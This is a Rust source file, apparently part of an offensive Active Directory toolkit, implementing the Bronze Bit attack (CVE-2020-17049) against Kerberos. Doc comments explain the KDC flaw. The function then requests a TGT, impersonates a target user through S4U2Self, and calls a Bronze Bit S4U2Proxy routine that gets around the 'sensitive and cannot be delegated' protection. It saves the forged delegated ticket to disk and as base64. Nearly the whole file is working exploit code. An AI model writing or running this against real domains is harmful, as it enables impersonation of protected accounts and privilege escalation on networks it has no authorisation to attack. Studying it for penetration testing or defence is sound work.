//! Bronze Bit (CVE-2020-17049) — S4U2Proxy forwardable flag bypass.
//!
//! Services configured with `TrustedToAuthForDelegation` (constrained delegation)
//! can use S4U2Self to obtain a service ticket for any user, then use S4U2Proxy
//! to forward that ticket to the target service. Normally, the user must NOT have
//! the "Sensitive and cannot be delegated" flag — but Bronze Bit bypasses this.
//!
//! ## How It Works
//!
//! The KDC fails to verify that the forwarded ticket (passed in the `additional_tickets`
//! field of TGS-REQ) has the `FORWARDABLE` flag set. By passing a non-forwardable
//! S4U2Self ticket to S4U2Proxy, we can delegate users who are marked as sensitive.

use chrono::{Duration, Utc};
use kerberos_asn1::Asn1Object;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{self};
use tracing::info;

use crate::golden;
use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};

/// Run the Bronze Bit attack — delegate a sensitive user via S4U2Proxy bypass.
///
/// 1. Request TGT for the controlled user
/// 2. S4U2Self to impersonate the target (even if "sensitive and cannot be delegated")
/// 3. S4U2Proxy with the non-forwardable S4U2Self ticket using Bronze Bit PA-PAC-OPTIONS
/// 4. Save the delegated service ticket
pub async fn run_bronze_bit(config: &ForgeConfig, target_spn: &str) -> Result<ForgeResult> {
    info!(
        "[bronzebit] Running Bronze Bit (CVE-2020-17049): {} → {}",
        config.effective_impersonate(),
        target_spn
    );

    let password = config.password.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge(
            "Password is required for Bronze Bit (to request initial TGT)".into(),
        )
    })?;

    let impersonate = config.effective_impersonate();

    // Step 1: Request a legitimate TGT
    info!("[bronzebit] Step 1: Requesting TGT as {}", config.username);
    let user_tgt = kerberos::request_tgt(
        &config.dc_ip,
        &config.domain,
        &config.username,
        password,
        false,
    )
    .await?;

    // Step 2: S4U2Self for the impersonate user
    info!("[bronzebit] Step 2: S4U2Self as {impersonate}");
    let s4u2_self = kerberos::s4u2self(&config.dc_ip, &user_tgt, impersonate).await?;

    // Step 3: S4U2Proxy with Bronze Bit bypass (PA-PAC-OPTIONS with proxy flag)
    info!("[bronzebit] Step 3: S4U2Proxy with PA-PAC-OPTIONS (Bronze Bit)");
    let delegated_ticket = kerberos::s4u2proxy_bronzebit(
        &config.dc_ip,
        &user_tgt,
        &s4u2_self,
        target_spn,
        true, // use_pac_options
    )
    .await?;

    // Save the delegated service ticket
    let ticket_bytes = delegated_ticket.ticket.build();
    let realm = config.domain.to_uppercase();
    let now = Utc::now();
    let lifetime = config.effective_lifetime();
    let groups = config.effective_groups();

    // Build a simplified KRB-CRED (kirbi) for the response
    let ticket = &delegated_ticket.ticket;
    // Create a minimal EncTicketPart for the KRB-CRED wrapper
    let enc_part = kerberos_asn1::EncTicketPart {
        flags: kerberos_asn1::KerberosFlags { flags: 0x40E00000 },
        key: kerberos_asn1::EncryptionKey {
            keytype: delegated_ticket.session_key_etype,
            keyvalue: delegated_ticket.session_key.clone(),
        },
        crealm: delegated_ticket.client_realm.clone(),
        cname: kerberos_asn1::PrincipalName {
            name_type: 1,
            name_string: vec![delegated_ticket.client_principal.clone()],
        },
        transited: kerberos_asn1::TransitedEncoding {
            tr_type: 1,
            contents: Vec::new(),
        },
        authtime: kerberos_asn1::KerberosTime::from(now),
        starttime: Some(kerberos_asn1::KerberosTime::from(now)),
        endtime: kerberos_asn1::KerberosTime::from(now + Duration::hours(lifetime as i64)),
        renew_till: Some(kerberos_asn1::KerberosTime::from(now + Duration::days(1))),
        caddr: None,
        authorization_data: None,
    };

    let kirbi_bytes = golden::build_krb_cred(
        ticket,
        &enc_part,
        &delegated_ticket.session_key,
        delegated_ticket.session_key_etype,
    )?;
    let kirbi_path = golden::save_ticket(config, &kirbi_bytes, "bronzebit")?;
    let etype_str = golden::etype_name(delegated_ticket.session_key_etype);

    info!(
        "[bronzebit] Bronze Bit ticket for {target_spn} forged ({} bytes)",
        ticket_bytes.len()
    );

    Ok(ForgeResult {
        action: format!("Bronze Bit → {target_spn}"),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "Bronze Bit (delegated TGS)".to_string(),
            impersonated_user: impersonate.to_string(),
            domain: realm.clone(),
            spn: target_spn.to_string(),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(lifetime as i64))
                .format("%Y-%m-%d %H:%M:%S UTC")
                .to_string(),
            group_rids: groups,
            extra_sids: config.extra_sids.clone(),
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(golden::base64_encode(&kirbi_bytes)),
            ticket_size_bytes: ticket_bytes.len(),
        }),
        persistence_result: None,
        message: format!(
            "Bronze Bit (CVE-2020-17049) completed: delegated {impersonate} → {target_spn} ({etype_str}). \
             Bypassed 'sensitive and cannot be delegated' restriction."
        ),
    })
}
